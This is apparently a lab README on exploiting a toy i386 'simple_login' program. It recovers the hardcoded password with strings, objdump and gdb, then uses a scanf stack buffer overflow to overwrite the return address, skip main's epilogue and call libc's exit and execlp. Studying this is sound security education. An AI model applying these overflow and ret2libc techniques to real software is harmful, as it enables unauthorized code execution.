# simple_login

You can prefix all commands with `./with-docker.sh` to run them in a i386
Debian container. This allows us to easily run it on NixOS and we do not have
manage a multilib environment.

## intialized GDB session

`make gdb-tui` runs `gdb -x gdb/tui.txt ./simple_login` in the container.
[gdb/tui.txt](./gdb/tui.txt) enables gdb's TUI with assembly and register view.
Breakpoints are set at the beginning of simple_login's `verify_password` and
right after its call to `scanf`. The second breakpoint allows us to `continue`
when stepping through with gdb lands us in libc's `scanf`.

## Finding out the password

The password is `AaMilmFS+z11/2J`.

### 1. `strings simple_login`

We can use binutils' `strings` to show all printable strings in simple_login.
Between the many symbols, near the top of the output are simple_login's output
phrases and the string `AaMilmFS+z11/2J`.

### 2. `objdump -s -j .rodata simple_login`

Binutils' `objdump` can also dump the `.rodata` section of simple_login, where
strings are stored. In the hexdump we can see `AaMilmFS+z11/2J` again.

### 3. `gdb -x gdb/password.txt ./simple_login`

[gdb/password.txt](./gdb/password.txt) sets the breakpoint `*(verify_password+84)`.
This is where the input string is compared to the password:

```asm
   0x080483e5 <+65>:    cld
   0x080483e6 <+66>:    mov    esi,DWORD PTR [ebp-0xe0]
   0x080483ec <+72>:    mov    edi,DWORD PTR [ebp-0xe4]
   0x080483f2 <+78>:    mov    ecx,DWORD PTR [ebp-0xe8]
=> 0x080483f8 <+84>:    repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
```

The code is explained in this [StackOverflow answer](https://stackoverflow.com/a/44630309)
and compares the data pointed to by registers `esi` (which holds the input)
and `edi` (which holds the password). (`cld` clears the direction flag, which
means `repz` will increment `esi` and `edi`.)

`print/s (char *)$edi` yields the hardcoded password.

## Malicious input

### Inspection

`verify_password` is called with *cdecl* calling conventions. Tbis means that
first the functions arguments are pushed, second its return address, and third
the function is called.

The called function receives a preamble as well, where it pushes the `ebp`
register and set's its own `ebp` to `esp` so it can access local variables in
its stack frame relative to `ebp`. (Saving and restoring some registers is
the responsibility of the callee as well.) A matching postamble is created,
that restores the caller's `ebp` before returning to the caller.

After executing the preamble the stack will look like this:

`*(void **)ebp`
: the saved value of `ebp` from the caller, that will be restored in the postamble

`*((void **)ebp + 1)`
: (The word after the address pinted to by `ebp`, (+4 bytes))
: the return address pushed by the call instruction

`(char *)ebp - x`
: addresses of the function's local variables

Knowing this we step through the program with gdb:

  * start gdb and run `simple_login` until it called `verify_password`

    ```
    $ gdb ./simple_login
    (gdb) break verify_password
    (gdb) run < /dev/null
    ```
  * gdb will now stop the execution at our breakpoint
  * ```
    (gdb) set disassembly-flavor intel`
    (gdb) disassemble
    ```

    ```asm
    Dump of assembler code for function verify_password:
       0x080483a4 <+0>:     push   ebp
       0x080483a5 <+1>:     mov    ebp,esp
       0x080483a7 <+3>:     push   edi
       0x080483a8 <+4>:     push   esi
       0x080483a9 <+5>:     sub    esp,0xf0
    => 0x080483af <+11>:    lea    eax,[ebp-0xd0]
       0x080483b5 <+17>:    mov    DWORD PTR [esp+0x4],eax
       0x080483b9 <+21>:    mov    DWORD PTR [esp],0x804855c
       0x080483c0 <+28>:    call   0x80482f8 <scanf@plt>
       0x080483c5 <+33>:    lea    eax,[ebp-0xd0]
       0x080483cb <+39>:    mov    DWORD PTR [ebp-0xe0],eax
       0x080483d1 <+45>:    mov    DWORD PTR [ebp-0xe4],0x804855f
       0x080483db <+55>:    mov    DWORD PTR [ebp-0xe8],0x10
       0x080483e5 <+65>:    cld
       0x080483e6 <+66>:    mov    esi,DWORD PTR [ebp-0xe0]
       0x080483ec <+72>:    mov    edi,DWORD PTR [ebp-0xe4]
       0x080483f2 <+78>:    mov    ecx,DWORD PTR [ebp-0xe8]
       0x080483f8 <+84>:    repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
       0x080483fa <+86>:    seta   dl
       0x080483fd <+89>:    setb   al
       0x08048400 <+92>:    mov    ecx,edx
       0x08048402 <+94>:    sub    cl,al
       0x08048404 <+96>:    mov    eax,ecx
       0x08048406 <+98>:    movsx  eax,al
       0x08048409 <+101>:   test   eax,eax
       0x0804840b <+103>:   jne    0x8048419 <verify_password+117>
       0x0804840d <+105>:   mov    DWORD PTR [ebp-0xdc],0x1
       0x08048417 <+115>:   jmp    0x8048423 <verify_password+127>
       0x08048419 <+117>:   mov    DWORD PTR [ebp-0xdc],0x0
       0x08048423 <+127>:   mov    eax,DWORD PTR [ebp-0xdc]
       0x08048429 <+133>:   add    esp,0xf0
       0x0804842f <+139>:   pop    esi
       0x08048430 <+140>:   pop    edi
       0x08048431 <+141>:   pop    ebp
       0x08048432 <+142>:   ret
    End of assembler dump.
    ```

    The `sub esp,0xf0` tells us 240 bytes were reserved on the stack for local
    variables. (This is a little misleading because the compiler already
    allocates space for the arguments of `scanf` as well.)
  * inspect local variables

    ```
    (gdb) info locals
    password = "\000..."
    ```
  * show the type of the variable *password*

    ```
    (gdb) ptype password
    type = char [200]
    ```

  * show the address of *password*

    ```
    (gdb) print/a &password
    $1 = 0xffffdb68
    ```
  * We now know `verify_password` has a local variable `char password[200]`
    at 0xffffdb68.
  * ```asm
    => 0x080483af <+11>:    lea    eax,[ebp-0xd0]
       0x080483b5 <+17>:    mov    DWORD PTR [esp+0x4],eax
       0x080483b9 <+21>:    mov    DWORD PTR [esp],0x804855c
       0x080483c0 <+28>:    call   0x80482f8 <scanf@plt>
    ```

    From this assembler code we can tell that `scanf("%s", password)` is called.
    (`print/s (char *)0x804855c` will tell us the format string `"%s"` and
    `print/a $ebp - 0xd0` that a pointer to *password* is passed.)
  * pointer to the return address

    ```
    (gdb) print/a (void **)$ebp + 1
    $1 = 0xffffdc38
    ```
  * show us the return address

    ```
    (gdb) print/a *((void **)$ebp + 1)
    $1 = 0x8048455 <main+34>
    ```
  * From this we can tell the return address is 0xffffdc38 - 0xffffdb68 = 212
    bytes after *password*.
  * Now we change return address through *password* create a new breakpoint and
    see what happens at `ret`.

    ```
    (gdb) set *(void **)(password + 212) = -1
    (gdb) break *(verify_password+142)
    (gdb) continue
    (gdb) stepi
    0xffffffff in ?? ()
    ```

We successfully manipulated the return address by writing to *password*.

Since `scanf` does not do any bounds checking, we can override the return
address if we make `scanf` read 216 bytes into *password*.

### Implementation

[overflow.c](./overflow.c) takes a hexadecimal address as an argument and
generates an input for `simple_login` that will exploit the buffer overflow
and makes `simple_login` execute code at that address.

### Test

`make test-overflow-sigsegv` runs `simple_login` with an input that makes it
jump to 0xFFFFFFFF. `make gdb-overflow` runs the same in gdb and prints
relevant information while running. You can see that `verify_password` returns
execution to 0xFFFFFF.

### Avoiding SIGSEGV

When we manipulate the return address it should point to a page mapped to the
process otherwise a SEGFAULT will be caused. Since 0xFFFFFFFF is an error code
of `mmap` this address should never be mapped to the process and should always
cause a SEGFAULT.

But even if we were to overwrite the return address with its original value
(`0x8048455 <main+34>`) a SEGFAULT will be caused. This is because the `ebp`
register is saved before the return address and will be always be overwritten
by `scanf` as well. In `verify_password+141` the original value is restored
from the stack so `main` can access its local variables again, but since its
value changed (to `0x78787878` to be precise) `main` will cause a SEGFAULT
when accessing its local variables.

  * Start gdb and run `simple_login` with input that overwrites the return
    address. But overwrite it with its original value.

    ```
    $ make overflow
    $ ./overflow 0x8048455 > overflow.txt
    $ gdb ./simple_login
    (gdb) break verify_password
    (gdb) run < overflow.txt
    ```
  * gdb will now stop when `verify_password` is called
  * show the original rerurn address and saved `ebp`

    ```
    (gdb) print/a *((void **)$ebp + 1)
    $1 = 0x8048455 <main+34>
    (gdb) print/a *(void **)$ebp
    $1 = 0xffffdcc8
    ```
  * continue until `scanf` returned and show the overwritten return address
    and the saved `ebp`

    ```
    (gdb) break *(verify_password+33)
    (gdb) continue
    (gdb) print/a *((void **)$ebp + 1)
    $1 = 0x8048455 <main+34>
    (gdb) print/a *(void **)$ebp
    $1 = 0x78787878
    ```
  * continue until `verify_password` returned

    ```
    (gdb) break *(verify_password+142)
    (gdb) continue
    (gdb) stepi
    (gdb) print/a $ebp
    $1 = 0x78787878
    (gdb) set disassembly-flavor intel`
    (gdb) disassemble
    ```

    ```asm
    Dump of assembler code for function main:
       0x08048433 <+0>:     lea    ecx,[esp+0x4]
       0x08048437 <+4>:     and    esp,0xfffffff0
       0x0804843a <+7>:     push   DWORD PTR [ecx-0x4]
       0x0804843d <+10>:    push   ebp
       0x0804843e <+11>:    mov    ebp,esp
       0x08048440 <+13>:    push   ecx
       0x08048441 <+14>:    sub    esp,0x24
       0x08048444 <+17>:    mov    DWORD PTR [esp],0x804856f
       0x0804844b <+24>:    call   0x8048308 <puts@plt>
       0x08048450 <+29>:    call   0x80483a4 <verify_password>
    => 0x08048455 <+34>:    mov    DWORD PTR [ebp-0x8],eax
       0x08048458 <+37>:    cmp    DWORD PTR [ebp-0x8],0x0
       0x0804845c <+41>:    jne    0x8048473 <main+64>
       0x0804845e <+43>:    mov    DWORD PTR [esp],0x804858b
       0x08048465 <+50>:    call   0x8048308 <puts@plt>
       0x0804846a <+55>:    mov    DWORD PTR [ebp-0x18],0x1
       0x08048471 <+62>:    jmp    0x8048486 <main+83>
       0x08048473 <+64>:    mov    DWORD PTR [esp],0x8048598
       0x0804847a <+71>:    call   0x8048308 <puts@plt>
       0x0804847f <+76>:    mov    DWORD PTR [ebp-0x18],0x0
       0x08048486 <+83>:    mov    eax,DWORD PTR [ebp-0x18]
       0x08048489 <+86>:    add    esp,0x24
       0x0804848c <+89>:    pop    ecx
       0x0804848d <+90>:    pop    ebp
       0x0804848e <+91>:    lea    esp,[ecx-0x4]
       0x08048491 <+94>:    ret
    End of assembler dump.
    ```
  * The next instruction causes a SEGFAULT because it will try to access a
    variable relative to `ebp`.

    ```
    (gdb) stepi

    Program received signal SIGSEGV, Segmentation fault.
    0x08048455 in main (argc=<optimized out>, argv=<optimized out>) at login.c:17
    17      in login.c
    ```

We could try to guess the saved value of `ebp` but normally the address of the
stack is randomized. gdb tries to disable that and we could use `0xffffdcc8`
(run `gdb -x gdb/ebp.txt ./simple_login` repeatedly), but we cannot ensure that
randomization is disabled. (You can try this by running `make gdb-overflow-nothing`.)

But if we were to jump to `0x08048489 <main+86>` we would skip all instructions
relying on `ebp` and execute the postamble of `main` directly. `main` will
return cleanly and the process will exit normally.

### `exit(0)`

The return value of `main` will be used as the programs exit code. The return
value is stored in `eax` and since we skip `mov eax,DWORD PTR [ebp-0x18]`
`main` does not set its own return value but uses current value of `eax`.
`eax` will hold the return value of `verify_password`. This return value is `1`
if the input password matched the expected password and `0` otherwise.
`simple_login` will therefore exit successfully if the password did **not**
match and with `1` if the password matched.

Therefore `overflow` will by default generate input that fails the password
comparison, but can be told to generate a malicious input that will satsify the
password comparison by passing `-v`.

### Code Injection

#### `exit(e)`

If address randomization is disabled we can call any function in libc as long
as we know its address. `./overflow -e2 0xf7dcfd50` will prepare the stack so
that the function at 0xf7dcfd50, which is `exit`, will be called with an
argument of `2`.

#### `execlp(...)`

Functions with pointer arguments are tricky since we would have to know the
address of the read buffer. But if the address of the buffer is 0xffffdb68
`./overflow -x 0xf7e74470 objdump -d -Mintel simple_login` will generate an
input that will execute `objdump -d -Mintel simple_login` and disassemble
`simple_login` for us.

This currently only works in gdb, without it the address of the read buffer
differs.
